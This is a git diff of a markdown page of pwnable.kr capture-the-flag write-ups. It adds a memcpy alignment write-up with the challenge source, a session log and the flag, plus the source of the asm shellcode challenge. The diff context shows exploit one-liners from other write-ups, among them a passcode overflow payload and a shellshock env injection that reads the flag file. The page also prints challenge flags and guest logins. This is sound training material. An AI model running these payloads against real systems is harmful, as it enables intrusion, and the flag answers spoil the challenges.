@@ -8,7 +8,9 @@ pagination:
   enabled: true
 ---
 
-# [](#header-1)fd
+# [](#header-1)[Toddler's Bottle]
+
+## [](#header-2)fd
 
 > Mommy! what is a file descriptor in Linux?
 >
@@ -54,7 +56,7 @@ LETMEWIN
 > mommy! I think I know what a file descriptor is!!
 ```
 
-# [](#header-1)collision
+## [](#header-2)collision
 
 > Daddy told me about cool MD5 hash collision today.
 > 
@@ -113,7 +115,7 @@ int main(int argc, char* argv[]){
 ```
 `daddy! I just managed to create a hash collision :)`
 
-# [](#header-1)bof
+## [](#header-2)bof
 
 > Nana told me that buffer overflow is one of the most common software vulnerability.
 > Is that true? Download: http://pwnable.kr/bin/bof
@@ -154,7 +156,7 @@ int main(int argc, char* argv[]){
 
 `daddy, I just pwned a buFFer :)`
 
-# [](#header-1)flag
+## [](#header-2)flag
 
 > Papa brought me a packed present! let's open it.
 > 
@@ -174,7 +176,7 @@ $Id: UPX 3.08 Copyright © 1996-2011 the UPX Team. All Rights Reserved. $
 
 `UPX…? sounds like a delivery service :)`
 
-# [](#header-1)passcode
+## [](#header-2)passcode
 
 > Mommy told me to make a passcode based login system.
 > 
@@ -266,7 +268,7 @@ python -c "print '\x01'*96 + '\x04\xa0\x04\x08' + '134514147'" | ./passcode
 
 `Sorry mom… I got confused about scanf usage :(`
 
-# [](#header-1)random
+## [](#header-2)random
 
 > Daddy, teach me how to use random value in programming!
 > 
@@ -309,7 +311,7 @@ key ^ 0x6b8b4567 == 0xdeadbeef --> 0x6b8b4567 ^ 0xdeadbeef == 0xb526fb88 == 3039
 > 
 > Mommy, I thought libc random is unpredictable…
 
-# [](#header-1)input
+## [](#header-2)input
 
 > Mom? how can I pass my input to a computer program?
 > 
@@ -426,7 +428,7 @@ s.close()
 [stroobants.dev/pwnablekr-series-input.html](https://stroobants.dev/pwnablekr-series-input.htmlhttps://stroobants.dev/pwnablekr-series-input.html)
 
 
-# [](#header-1)leg
+## [](#header-2)leg
 
 > Daddy told me I should study arm.
 > 
@@ -577,7 +579,7 @@ End of assembler dump.
 > My daddy has a lot of ARMv5te muscle!
 
 
-# [](#header-1)mistake
+## [](#header-2)mistake
 
 > We all make mistakes, let’s move on.
 > 
@@ -663,7 +665,7 @@ Password OK
 Mommy, the operator priority always confuses me :(
 ```
 
-# [](#header-1)shellshock
+## [](#header-2)shellshock
 
 > Mommy, there was a shocking news about bash.
 > 
@@ -688,7 +690,7 @@ env x='() { :;}; /bin/cat flag' ./shellshock
 only if I knew CVE-2014-6271 ten years ago…!!
 ```
 
-# [](#header-1)coin1
+## [](#header-2)coin1
 
 > Mommy, I wanna play a game!
 > 
@@ -793,7 +795,7 @@ conn.close()
 
 [код отсюда](https://zacheller.dev/pwnable-coin1)
 
-# [](#header-1)blackjack
+## [](#header-2)blackjack
 
 > Hey! check out this C implementation of blackjack game!
 > 
@@ -843,7 +845,7 @@ int betting() //Asks user amount to bet
 
 `YaY_I_AM_A_MILLIONARE_LOL`
 
-# [](#header-1)lotto
+## [](#header-2)lotto
 
 > Mommy! I made a lotto program for my homework.
 > 
@@ -971,7 +973,7 @@ for i in range(1000):
 
 `sorry mom… I FORGOT to check duplicate numbers… :(`
 
-# [](#header-1)cmd1
+## [](#header-2)cmd1
 
 > Mommy! what is PATH environment in Linux?
 > 
@@ -1018,7 +1020,7 @@ Double quotes executes the command then passes its output (cannot pass the filte
 
 `mommy now I get what PATH environment is for :)`
 
-# [](#header-1)cmd2
+## [](#header-2)cmd2
 
 > Daddy bought me a system command shell.
 > 
@@ -1067,7 +1069,7 @@ int main(int argc, char* argv[], char** envp){
 
 `FuN_w1th_5h3ll_v4riabl3s_haha`
 
-# [](#header-1)uaf
+## [](#header-2)uaf
 
 > Mommy, what is Use After Free bug?
 > 
@@ -1171,49 +1173,319 @@ https://gist.github.com/ihciah/3c157f18f49bd2287470
 
 https://medium.com/@c0ngwang/pwnable-kr-writeup-uaf-4cb8ba851472
 
+## [](#header-2)memcpy
+> Are you tired of hacking?, take some rest here.
+> Just help me out with my small experiment regarding memcpy performance. 
+> after that, flag is yours.
+> 
+> http://pwnable.kr/bin/memcpy.c
+> 
+> ssh memcpy@pwnable.kr -p2222 (pw:guest)
 
-# [](#header-1)memcpy
-# [](#header-1)asm
-# [](#header-1)unlink
-# [](#header-1)blukat
-# [](#header-1)horcruxes
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
-# [](#header-1)
+memcpy.c:
+```c
+// compiled with : gcc -o memcpy memcpy.c -m32 -lm
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+#include <sys/mman.h>
+#include <math.h>
+
+unsigned long long rdtsc(){
+        asm("rdtsc");
+}
+
+char* slow_memcpy(char* dest, const char* src, size_t len){
+	int i;
+	for (i=0; i<len; i++) {
+		dest[i] = src[i];
+	}
+	return dest;
+}
+
+char* fast_memcpy(char* dest, const char* src, size_t len){
+	size_t i;
+	// 64-byte block fast copy
+	if(len >= 64){
+		i = len / 64;
+		len &= (64-1);
+		while(i-- > 0){
+			__asm__ __volatile__ (
+			"movdqa (%0), %%xmm0\n"
+			"movdqa 16(%0), %%xmm1\n"
+			"movdqa 32(%0), %%xmm2\n"
+			"movdqa 48(%0), %%xmm3\n"
+			"movntps %%xmm0, (%1)\n"
+			"movntps %%xmm1, 16(%1)\n"
+			"movntps %%xmm2, 32(%1)\n"
+			"movntps %%xmm3, 48(%1)\n"
+			::"r"(src),"r"(dest):"memory");
+			dest += 64;
+			src += 64;
+		}
+	}
+
+	// byte-to-byte slow copy
+	if(len) slow_memcpy(dest, src, len);
+	return dest;
+}
+
+int main(void){
+
+	setvbuf(stdout, 0, _IONBF, 0);
+	setvbuf(stdin, 0, _IOLBF, 0);
+
+	printf("Hey, I have a boring assignment for CS class.. :(\n");
+	printf("The assignment is simple.\n");
+
+	printf("-----------------------------------------------------\n");
+	printf("- What is the best implementation of memcpy?        -\n");
+	printf("- 1. implement your own slow/fast version of memcpy -\n");
+	printf("- 2. compare them with various size of data         -\n");
+	printf("- 3. conclude your experiment and submit report     -\n");
+	printf("-----------------------------------------------------\n");
+
+	printf("This time, just help me out with my experiment and get flag\n");
+	printf("No fancy hacking, I promise :D\n");
+
+	unsigned long long t1, t2;
+	int e;
+	char* src;
+	char* dest;
+	unsigned int low, high;
+	unsigned int size;
+	// allocate memory
+	char* cache1 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+	char* cache2 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+	src = mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+
+	size_t sizes[10];
+	int i=0;
+
+	// setup experiment parameters
+	for(e=4; e<14; e++){	// 2^13 = 8K
+		low = pow(2,e-1);
+		high = pow(2,e);
+		printf("specify the memcpy amount between %d ~ %d : ", low, high);
+		scanf("%d", &size);
+		if( size < low || size > high ){
+			printf("don't mess with the experiment.\n");
+			exit(0);
+		}
+		sizes[i++] = size;
+	}
+
+	sleep(1);
+	printf("ok, lets run the experiment with your configuration\n");
+	sleep(1);
+
+	// run experiment
+	for(i=0; i<10; i++){
+		size = sizes[i];
+		printf("experiment %d : memcpy with buffer size %d\n", i+1, size);
+		dest = malloc( size );
+
+		memcpy(cache1, cache2, 0x4000);		// to eliminate cache effect
+		t1 = rdtsc();
+		slow_memcpy(dest, src, size);		// byte-to-byte memcpy
+		t2 = rdtsc();
+		printf("ellapsed CPU cycles for slow_memcpy : %llu\n", t2-t1);
+
+		memcpy(cache1, cache2, 0x4000);		// to eliminate cache effect
+		t1 = rdtsc();
+		fast_memcpy(dest, src, size);		// block-to-block memcpy
+		t2 = rdtsc();
+		printf("ellapsed CPU cycles for fast_memcpy : %llu\n", t2-t1);
+		printf("\n");
+	}
+
+	printf("thanks for helping my experiment!\n");
+	printf("flag : ----- erased in this source code -----\n");
+	return 0;
+}
+```
+
+Commands `movntps` and `movdqa` work only with memory operands aligned on a 16-byte
+
+While debugging we get an error that `movdqa` tries to copy data to dest operand, which adress is not alligned by 16
+
+According to glibc operands in 32 bit by default alligned as 8 (-m32 was used while compiling, so)
+
+```
+memcpy@pwnable:~$ nc 0 9022 < /tmp/inp
+Hey, I have a boring assignment for CS class.. :(
+The assignment is simple.
+-----------------------------------------------------
+- What is the best implementation of memcpy?        -
+- 1. implement your own slow/fast version of memcpy -
+- 2. compare them with various size of data         -
+- 3. conclude your experiment and submit report     -
+-----------------------------------------------------
+This time, just help me out with my experiment and get flag
+No fancy hacking, I promise :D
+specify the memcpy amount between 8 ~ 16 : specify the memcpy amount between 16 ~ 32 : specify the memcpy amount between 32 ~ 64 : specify the memcpy amount between 64 ~ 128 : specify the memcpy amount between 128 ~ 256 : specify the memcpy amount between 256 ~ 512 : specify the memcpy amount between 512 ~ 1024 : specify the memcpy amount between 1024 ~ 2048 : specify the memcpy amount between 2048 ~ 4096 : specify the memcpy amount between 4096 ~ 8192 : ok, lets run the experiment with your configuration
+experiment 1 : memcpy with buffer size 8
+ellapsed CPU cycles for slow_memcpy : 5616
+ellapsed CPU cycles for fast_memcpy : 620
+
+experiment 2 : memcpy with buffer size 16
+ellapsed CPU cycles for slow_memcpy : 908
+ellapsed CPU cycles for fast_memcpy : 606
+
+experiment 3 : memcpy with buffer size 32
+ellapsed CPU cycles for slow_memcpy : 1046
+ellapsed CPU cycles for fast_memcpy : 1084
+
+experiment 4 : memcpy with buffer size 72
+ellapsed CPU cycles for slow_memcpy : 1662
+ellapsed CPU cycles for fast_memcpy : 640
+
+experiment 5 : memcpy with buffer size 136
+ellapsed CPU cycles for slow_memcpy : 2978
+ellapsed CPU cycles for fast_memcpy : 580
+
+experiment 6 : memcpy with buffer size 264
+ellapsed CPU cycles for slow_memcpy : 5514
+ellapsed CPU cycles for fast_memcpy : 608
+
+experiment 7 : memcpy with buffer size 520
+ellapsed CPU cycles for slow_memcpy : 11344
+ellapsed CPU cycles for fast_memcpy : 756
+
+experiment 8 : memcpy with buffer size 1032
+ellapsed CPU cycles for slow_memcpy : 22016
+ellapsed CPU cycles for fast_memcpy : 1038
+
+experiment 9 : memcpy with buffer size 2056
+ellapsed CPU cycles for slow_memcpy : 42144
+ellapsed CPU cycles for fast_memcpy : 1684
+
+experiment 10 : memcpy with buffer size 4096
+ellapsed CPU cycles for slow_memcpy : 83962
+ellapsed CPU cycles for fast_memcpy : 2612
+
+thanks for helping my experiment!
+flag : 1_w4nn4_br34K_th3_m3m0ry_4lignm3nt
+```
+
+## [](#header-2)asm
+> Mommy! I think I know how to make shellcodes
+> 
+> ssh asm@pwnable.kr -p2222 (pw: guest)
+
+asm.c:
+```c
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+#include <seccomp.h>
+#include <sys/prctl.h>
+#include <fcntl.h>
+#include <unistd.h>
+
+#define LENGTH 128
+
+void sandbox(){
+	scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
+	if (ctx == NULL) {
+		printf("seccomp error\n");
+		exit(0);
+	}
+
+	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
+	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
+	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
+	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
+	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
+
+	if (seccomp_load(ctx) < 0){
+		seccomp_release(ctx);
+		printf("seccomp error\n");
+		exit(0);
+	}
+	seccomp_release(ctx);
+}
+
+char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
+unsigned char filter[256];
+int main(int argc, char* argv[]){
+
+	setvbuf(stdout, 0, _IONBF, 0);
+	setvbuf(stdin, 0, _IOLBF, 0);
+
+	printf("Welcome to shellcoding practice challenge.\n");
+	printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
+	printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
+	printf("If this does not challenge you. you should play 'asg' challenge :)\n");
+
+	char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
+	memset(sh, 0x90, 0x1000);
+	memcpy(sh, stub, strlen(stub));
+	
+	int offset = sizeof(stub);
+	printf("give me your x64 shellcode: ");
+	read(0, sh+offset, 1000);
+
+	alarm(10);
+	chroot("/home/asm_pwn");	// you are in chroot jail. so you can't use symlink in /tmp
+	sandbox();
+	((void (*)(void))sh)();
+	return 0;
+}
+```
+
+## [](#header-2)unlink
+## [](#header-2)blukat
+## [](#header-2)horcruxes
+# [](#header-1)[Rookiss]
+## [](#header-2)brain fuck
+## [](#header-2)md5 calculator
+## [](#header-2)simple login
+## [](#header-2)otp
+## [](#header-2)ascii_easy
+## [](#header-2)tiny_easy
+## [](#header-2)fsb
+## [](#header-2)dragon
+## [](#header-2)fix
+## [](#header-2)syscall
+## [](#header-2)crypto1
+## [](#header-2)echo1
+## [](#header-2)echo2
+## [](#header-2)rsa calculator
+## [](#header-2)note
+## [](#header-2)alloca
+## [](#header-2)loveletter
+# [](#header-1)[Grotesque]
+## [](#header-2)rootkit
+## [](#header-2)dos4fun
+## [](#header-2)ascii
+## [](#header-2)aeg
+## [](#header-2)coin2
+## [](#header-2)maze
+## [](#header-2)wtf
+## [](#header-2)sudoku
+## [](#header-2)starcraft
+## [](#header-2)cmd3
+## [](#header-2)elf
+## [](#header-2)lfh
+## [](#header-2)lokihardt
+## [](#header-2)asg
+## [](#header-2)hunter
+## [](#header-2)mipstake
+# [](#header-1)[Hacker's Secret]
+## [](#header-2)unexploitable
+## [](#header-2)tiny
+## [](#header-2)softmmu
+## [](#header-2)towelroot
+## [](#header-2)nuclear
+## [](#header-2)malware
+## [](#header-2)exploitable
+## [](#header-2)tiny_hard
+## [](#header-2)kcrc
+## [](#header-2)exynos
+## [](#header-2)combabo calculator
+## [](#header-2)pwnsandbox
+## [](#header-2)crcgen
